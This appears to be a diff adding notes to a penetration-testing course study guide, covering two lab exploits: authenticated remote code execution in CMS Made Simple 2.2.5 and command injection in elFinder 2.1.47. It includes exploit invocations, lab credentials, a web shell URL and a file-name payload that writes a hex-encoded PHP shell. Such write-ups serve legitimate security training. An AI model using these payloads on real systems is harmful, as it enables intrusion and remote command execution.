@@ -1235,7 +1235,26 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
   - netcat reverse shell received: `gci C:\ -Filter flag.txt -Recurse -ea SilentlyContinue`
 
 ### Fixing exploits  
-- 
+- **Capstone lab**: CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution
+  - Modify 44976.py
+    ```
+    username = "offsec" # change username
+    password = "lFEZK1vMpzeyZ71e8kRRqXrFAs9X16iJ" # change password
+    base_url = "http://192.168.171.52/cmsms/admin" # change from "http://192.168.1.10/cmsms/admin"
+    ```
+  - `python2 44976.py`
+  - `http://192.168.171.52/cmsms/uploads/shell.php?cmd=cat /home/flag.txt`  
+- **Capstone lab**: elFinder 2.1.47 - 'PHP connector' Command Injection
+  - `gobuster dir -u http://192.168.171.46:80 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -t5`: http://192.168.171.46/seclab/
+  - `searchsploit elFinder` [elFinder 2.1.47 - 'PHP connector' Command Injection](https://www.exploit-db.com/exploits/46481)
+  - inspect the code
+    ```
+    url = sys.argv[1]` #expect url param
+    payload = 'SecSignal.jpg;echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a | xxd -r -p > SecSignal.php;echo SecSignal.jpg
+    ```
+  - `cp /var/lib/inetsim/http/fakefiles/sample.jpg SecSignal.jpg`  
+  - `python2 46481.py http://192.168.171.46/seclab/`  
+  - `cat /var/www/http/seclab/php/flag.txt`  
 
 ### Password Attacks  
 - 16.1.1 SSH and RDP
